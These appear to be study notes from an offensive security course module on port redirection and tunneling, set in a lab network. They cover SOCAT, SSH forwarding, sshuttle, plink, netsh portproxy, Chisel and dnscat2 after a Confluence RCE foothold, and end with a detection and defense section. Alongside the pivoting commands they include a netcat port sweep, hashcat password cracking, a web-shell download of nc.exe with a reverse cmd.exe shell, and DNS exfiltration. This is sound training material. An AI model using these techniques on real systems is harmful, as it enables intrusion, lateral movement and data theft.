PEN-200 — Port Redirection & Tunneling (blocks PRAT: SOCAT/SSH/sshuttle/ssh.exe/plink/netsh; PRAT2: Chisel HTTP + dnscat2 DNS)

Fuente: material del curso correspondiente (sin video público)

Objective

Once you have a foothold on a dual-homed host, the next wall is the network topology itself: the target you actually want sits on a subnet you cannot route to, and — in real engagements — perimeter firewalls and deep packet inspection (DPI) devices block everything but a couple of approved ports. This module builds a graduated toolkit for port redirection and tunneling: binding a listener on a host you control and pushing traffic through your foothold into deeper network layers. Each technique trades convenience against requirements (installed tools, open ports, privileges), so the skill is picking the right one for the current constraints:

  • No firewall between you and the foothold → SOCAT port forward.
  • SSH access to an internal host → SSH local / dynamic / remote / remote-dynamic port forwarding.
  • Want transparent routing instead of per-tool proxying → sshuttle (VPN-like).
  • Windows foothold → ssh.exe, plink.exe, or the native netsh portproxy.
  • DPI permits only HTTP or DNS out of the network → Chisel (HTTP tunnel) or dnscat2 (DNS tunnel).

All scenarios reuse one spine: compromise Confluence01 via CVE-2022-26134, then pivot toward a PostgreSQL server (pgdatabase01) and SMB host (HRshare) on successively deeper subnets.

Techniques

1. Scenario and lab framing — PRAT_02_01

The motivating scenario: a Linux Confluence server vulnerable to CVE-2022-26134 (pre-auth RCE) gives a reverse shell; enumeration reveals two NICs — one on the attacker's network, one on an internal subnet — plus plaintext PostgreSQL credentials and the DB server's IP/port in the Confluence config. Kali cannot route to the DB. Key vocabulary: WAN (big/expansive network — here standing in for the internet), DMZ (buffer segment of hosts more exposed to the less-trusted network). Open-socket icons on the diagram = listening TCP ports (8090 Confluence, 5432 PostgreSQL default).

2. Exploitation and enumeration of the pivot host — PRAT_02_02

The Rapid7 blog PoC for CVE-2022-26134 is a verbose curl to port 8090 whose URL path, once URL-decoded, is an OGNL injection (Object Graph Notation Language — Java expression language; injection = user input reaching the OGNL parser, and OGNL can execute Java) using Java's ProcessBuilder to spawn a bash interactive reverse shell. Rules applied:

  • Never run a payload without decoding and understanding it.
  • Re-target it manually: change the victim IP to 192.168.50.63 and the callback to the Kali listener — and do not blanket re-URL-encode, because the PoC deliberately leaves certain characters unencoded; encoding them changes how the server parses the URL and breaks execution.
  • Start a Netcat listener on TCP 4444, fire the curl, catch the shell; id shows the low-privileged confluence user.

Enumeration: ip address shows ens192 = 192.168.50.63 and ens224 = 10.4.50.63; ip route shows which subnets are reachable per interface. The config file yields the DB IP/port and plaintext credentials — but no psql on the box and no ability to install software as the low-priv user. With no firewall between Kali and Confluence01, the answer is a port forward on Confluence01.

3. Port forwarding with SOCAT — PRAT_02_03

SOCAT is a general-purpose relay that sets up a port forward in one command. On Confluence01:

socat -v tcp-listen:2345,fork tcp:<pgdatabase01-dmz-ip>:5432

-v verbose, tcp-listen:2345 binds the WAN interface, fork handles repeated connections instead of dying after the first, and the second socket is the forward target. From Kali, psql against Confluence01:2345 is now exactly a direct connection to PostgreSQL. In the confluence database, SELECT * FROM cwd_user; returns user rows with Atlassian password hashes — crack with:

hashcat -m 12001 hashes.txt fasttrack.txt

(mode 12001 = Atlassian; FastTrack is built into Kali). Weak policy → databaseadmin, hradmin, rdpadmin fall in minutes. Suspect reuse: enumeration shows pgdatabase01 also runs SSH. Kill the 2345 forward and re-bind:

socat -v tcp-listen:2222,fork tcp:<pgdatabase01-dmz-ip>:22
ssh databaseadmin@<confluence01-wan-ip> -p 2222

Password reuse confirmed — SSH as databaseadmin onto the DB server itself.

4. SSH local port forwarding (-L) — PRAT_03_01

SOCAT's limitation: listening and forwarding happen on the same host. With SSH local forwarding, the SSH client opens the listener and tunnels packets through the connection to the SSH server, which forwards them onward. New wrinkle: SOCAT is no longer on Confluence01, so SSH in from Confluence01 to pgdatabase01 (stabilize the reverse shell with Python's pty module first), then enumerate: ip address / ip route reveal pgdatabase01 is dual-homed onto 172.16.50.0/24. No port scanner installed — sweep with netcat instead:

for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2>&1; done | grep succeeded

Most time out; pgdatabase01 (172.16.50.215) actively refuses; 172.16.50.217 has 445 open (SMB). Rather than pull files hop-by-hop (172.16.50.217 → pgdatabase01 → Confluence01 → Kali), bind the forward inside the SSH connection:

ssh -L 0.0.0.0:4455:<hrshare-ip>:445 -n databaseadmin@<pgdatabase01-ip>

-L takes two sockets (listen-socket on the client : forward-socket); -n prevents a shell from opening (no output after the password is normal). The first reverse shell is now occupied by the SSH session, so catch a second shell with a re-targeted CVE payload, then confirm the listener with ss. From Kali:

smbclient -L <confluence01-wan-ip> -p 4455 -U hradmin --password=[REDACTED]

Listing the scripts share and downloading its file lands it straight on Kali — the tunnel erased the intermediate hops.

5. SSH dynamic port forwarding (-D) + Proxychains — PRAT_03_02

Local forwarding connects to one socket per SSH connection — tedious at scale. Dynamic forwarding makes the client listener a SOCKS proxy port: packets pushed through it reach any host/port the SSH server can route to, provided the client software speaks SOCKS. Setup:

ssh -D 0.0.0.0:9999 -n databaseadmin@<pgdatabase01-ip>

smbclient has no SOCKS option, so bridge with proxychains, whose config (/etc/proxychains4.conf) ends with the proxy definitions — replace them with a single socks5 <confluence01-wan-ip> 9999 line. Prepend the command instead of retargeting it:

proxychains smbclient -L <hrshare-ip> -U hradmin --password=[REDACTED]   # talks as if directly routed
proxychains nmap -sT -n -Pn --top-ports=20 -vvv <hrshare-ip>

Nmap flags: TCP connect scan (works through a proxy), skip DNS resolution, skip host discovery, top-20 ports; proxychains -vvv logs every attempted socket. Result: 135, 139, 445, 3389 open on HRshare. Tools that aren't SOCKS-aware ride the tunnel transparently via proxychains.

6. SSH remote port forwarding (-R) — PRAT_03_03

Real networks firewalls the fun away: inbound is controlled far more aggressively than outbound, so you can rarely connect to a port bound on the perimeter — but you can usually SSH out. Remote forwarding is "a reverse shell, but for port forwarding": the compromised host SSHes back to your SSH server and binds the listener there. Scenario: perimeter firewall permits only TCP 8090 inbound to Confluence01. On Kali, start the pre-installed OpenSSH server (ss confirms 22 on all interfaces, v4+v6), then from Confluence01:

ssh -R 2345:<pgdatabase01-dmz-ip>:5432 -n kali@<kali-ip>
psql -h 127.0.0.1 -p 2345 -U postgres   # on Kali — loopback listener, tunneled back through Confluence01

The -R syntax mirrors -L (listen socket first, forward socket second), but the listener lands on the SSH server (Kali loopback) and packets are forwarded by the SSH client (Confluence01). Database reached despite the firewall.

7. SSH remote dynamic port forwarding — PRAT_03_04

Remote forwarding keeps the one-socket-per-connection limitation. Remote dynamic forwarding combines -R with SOCKS: pass only a port and the SOCKS proxy binds on the SSH server's loopback; traffic flows back through the tunnel and out wherever the client can route. From Confluence01:

ssh -R 9998 -n kali@<kali-ip>        # bare port → SOCKS on Kali loopback
ss -lnt                              # on Kali: 9998 bound on v4+v6 loopback

Point /etc/proxychains4.conf at 9998 and scan the newly-found DMZ Windows box (blocked on the WAN except via Confluence01):

proxychains nmap -sT -n -Pn --top-ports=20 -vvv <multiserver03-ip>   # → 80, 135, 3389 open

This is the go-to for a fully firewalled foothold: one outbound SSH connection gives Kali a SOCKS port into everything Confluence01 can reach.

8. sshuttle — PRAT_03_05

Classic dynamic forwarding gets hard to manage with complex internal networks. sshuttle turns an SSH connection into something VPN-like by installing local routes that force traffic through the tunnel — no proxychains, tools connect transparently. Requirements: root on the SSH client, Python 3 on the SSH server (not always lightweight). In the lab, run it from Kali through the existing SOCAT forward (port 2222 → pgdatabase01:22):

sudo sshuttle -r databaseadmin@<confluence01-wan-ip> --ssh-cmd 'ssh -p 2222' 172.16.50.0/24

Afterward smbclient against HRshare works with zero proxy configuration — Kali behaves as if it were on pgdatabase01's network.

9. ssh.exe — SSH tunneling from Windows — PRAT_04_01

The OpenSSH client ships with Windows by default since the 1803 April 2018 update (ASR garbles this as "version 1.8.0.3") and as a Feature-on-Demand since 1709; binaries (ssh.exe, scp.exe, sftp.exe) live in C:\Windows\System32\OpenSSH\. Scenario: only RDP is open on multiserver03. RDP in with xfreerdp using the cracked rdpadmin credentials, open cmd.exe, verify with where ssh — found, and the bundled version > 7.6 supports remote dynamic forwarding:

ssh -R 9998 -n kali@<kali-ip>        # from cmd.exe on multiserver03

Point proxychains at the resulting SOCKS port on Kali and run psql through it — same command shape as a direct connection from multiserver03. Windows 11 client → Kali SSH server → pgdatabase01, all over an outbound SSH tunnel.

10. plink.exe — when OpenSSH is removed — PRAT_04_02

Admins may strip OpenSSH; the pre-bundling standard was PuTTY and its CLI counterpart plink (prefer plink in assessments — shell, not GUI). Scenario: multiserver03 now only exposes the web app on TCP 80; RDP blocked, ssh.exe removed. Chain: compromise the web app → drop a web shell (runs as the IIS default app-pool user) → start Apache2 on Kali, copy nc.exe from the /usr/share/windows-resources/binaries/ directory into the web root → download it via a PowerShell one-liner (-outfile c:\windows\temp\nc.exe) from the web shell → nc listener on 4446 on Kali → execute nc.exe -e cmd.exe from the shell → interactive shell. Then pull plink.exe the same way and build a remote port forward to reach the (firewalled) RDP port:

plink -R 9833:127.0.0.1:3389 kali@<kali-ip> -pw [REDACTED]

plink accepts username and password on the command line and prompts to cache the server host key. ss confirms 9833 on Kali loopback; connect with xfreerdp /v:<kali-ip>:9833 (custom RDP port appended to the address). Piping keystrokes into plink is discussed as the workaround for restrictive non-interactive shells.

11. netsh portproxy — native Windows forwarding — PRAT_04_03

Fully native option: netsh (Network Shell), interface portproxy subcontext — requires administrative privileges. Scenario: RDP directly into multiserver03; want SSH from Kali to pgdatabase01 via a forward on multiserver03. As administrator:

netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<multiserver03-ext-ip> connectport=22 connectaddress=<pgdatabase01-ip>
netstat -ano | findstr 2222                    # confirm listening
netsh interface portproxy show all             # confirm stored

Nmap from Kali shows filtered — the Windows firewall blocks the new listener. Poke the hole and remember it:

netsh advfirewall firewall add rule name="Port Forward SSH 2222" dir=in action=allow protocol=TCP localport=2222

(descriptive names matter — the rule is deleted by name). Now ssh to port 2222 on multiserver03 lands on pgdatabase01:22. Cleanup, in order:

netsh advfirewall firewall delete rule name="Port Forward SSH 2222"
netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=<multiserver03-ext-ip>

12. HTTP tunneling with Chisel — PRAT2_01_01 + 01_02

New constraint: a DPI device terminates all outbound traffic except HTTP, and all inbound ports except 8090. A raw reverse shell and SSH remote forwarding both die at the perimeter — the tunnel must look like HTTP. Chisel encapsulates a data stream in HTTP (over a WebSocket, as tcpdump shows) with SSH inside for encryption; client-server model, and one binary serves both roles. Plan: Chisel server on Kali, Chisel client on Confluence01, with reverse port forwarding — a SOCKS proxy port binds on the server (Kali) when the client connects.

Delivery: copy the chisel binary to the Apache2 web root, wget it down through the Confluence injection payload to /tmp/chisel, chmod +x (same amd64 Linux binary on both ends).

# Kali — server with reverse enabled (listens 8080)
./chisel server --bind 0.0.0.0:8080 --reverse
tcpdump -i ens192 tcp port 8080          # watch the websocket handshake arrive
# Confluence01 (via web shell; shell redirections background it)
./chisel client <kali-ip>:8080 R:socks >/dev/null 2>&1 &
ss -lnt                                   # on Kali: SOCKS port 1080 on loopback

To push SSH itself through the SOCKS port, ssh has no generic SOCKS flag — use ProxyCommand with a netcat that supports -x (Kali's traditional nc doesn't; install ncat):

sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' databaseadmin@<pgdatabase01-ip>

%h/%p are filled by ssh with the target host/port. Result: SSH into the internal DB server over a reverse HTTP tunnel — only HTTP-formatted traffic ever left the DMZ.

13. DNS tunneling fundamentals + dnscat2 — PRAT2_02_01 + 02_02

Even a host with no outbound connectivity usually has DNS: pgdatabase01 resolves through multiserver03 (10.4.50.64, confirmed with resolvectl), which relays queries for feline.corp to the authoritative server felineauthority on the WAN — a box we control. Fundamentals, staged with dnsmasq as a minimal authoritative server (auth-zone / auth-server in a sparse conf; run foreground, tcpdump on UDP 53):

  • Exfiltration: nslookup exfiltrateddata.feline.corp from pgdatabase01 → NXDOMAIN (no records), but tcpdump on felineauthority receives the A query: arbitrary data has crossed the perimeter inside a DNS query, with no direct connection.
  • Infiltration: dnsmasq serves txt-record entries; nslookup -type=txt feline.corp from pgdatabase01 returns the arbitrary strings. Binary payloads can ride as base64/hex-encoded TXT records reassembled server-side.

dnscat2 industrializes this: server on the authoritative NS (dnscat2 feline.corp, listening UDP 53), client on the compromised host (./dnscat2 feline.corp) → encrypted CNAME/TXT/MAX-type query chatter (tcpdump confirms; "DNS tunneling is certainly not stealthy"). The server session supports interactive windows (windows, window -i <id>), and its listen command works like ssh -L — a TCP forward through the DNS tunnel:

listen 127.0.0.1:4455 <hrshare-ip>:445      # in the dnscat2 command session
smbclient -L 127.0.0.1 -p 4455 -U ...       # from another felineauthority shell

SMB-over-TCP encapsulated in DNS-over-UDP is slow — expected — but it lists shares on a host two network layers away from felineauthority, with neither HRshare nor pgdatabase01 having any direct route out.

Detection & defense

  • SOCAT/netsh portproxy listeners on compromised hosts show up as unexpected local listeners — inventory ss/netstat baselines, alert on unusual bind addresses (0.0.0.0 on hosts that should not listen), and treat netsh interface portproxy rules and matching advfirewall rules as high-value persistence/redirect artifacts to audit (they survive until explicitly deleted).
  • SSH tunneling: outbound SSH from servers is rare and should be rare — egress-filter 22 (and detect long-lived outbound SSH sessions with sustained symmetric traffic). -L/-D/-R sessions all carry characteristic interactive/stream patterns; SSH audit logs (sshd on your boxes, the Kali side in the course) record every forward — defenders should log and review local/remote/dynamic forward messages on their own SSH servers, since attackers' relays are your visibility gap.
  • Proxychains/SOCKS funnels heterogeneous tooling through one socket: a single connection seeing sequential connects across many ports and services (smbclient, then nmap top-20) is the signature, not any individual tool.
  • sshuttle creates local routes and tunnels all traffic — endpoint-side detection is host-route changes; network-side it is essentially persistent SSH and high-volume.
  • CVE-2022-26134-class exploitation is the root cause everywhere here — patch internet-facing apps; and note the payload hygiene lesson cuts both ways: URL-encoding quirks that make PoCs break are also a detection feature (WAF rules can key on partially-encoded OGNL paths).
  • Password reuse (databaseadmin → SSH, rdpadmin → RDP) is what turns one webshell into network-wide access — enforce unique credentials per service, and store app-config DB passwords encrypted/least-privilege (the Confluence user should not hold credentials that also open SSH on the DB host).
  • DNS tunneling: dnscat2 is explicitly not stealthy — massive volumes of CNAME/TXT/MX queries to one authoritative zone, long random subdomains, NXDOMAIN storms. Detect per-client query volume, entropy of queried labels, and restrict internal resolvers from relaying arbitrary zones outbound; allow-list authoritative NS for domains you own. dnsmasq/authoritative servers you control should not resolve unknown zones for untrusted clients.
  • HTTP tunneling vs DPI: DPI that only whitelists HTTP is defeated by Chisel because format-compliance ≠ content-legitimacy — inspect for websockets to non-application hosts, unusual long-lived HTTP flows to single destinations, and binary uploads to servers that then generate outbound HTTP. Egress allow-listing to destinations, not just protocols, is the actual control.
  • Windows hosts: where ssh, presence of plink.exe/nc.exe in C:\Windows\Temp, and admin-context netsh calls are the host-side fingerprints; application-control/WDAC policies preventing unsigned binaries in temp and non-admin users from netsh advfirewall/portproxy changes blunt the whole Windows section.
  • Cross-cutting: every technique assumed one foothold with valid credentials — the defensive priority is keeping that first foothold from becoming a routing node: segment so DMZ hosts cannot reach deeper subnets' admin services, and monitor for dual-homed hosts (the entire module is enabled by Confluence01's second NIC).
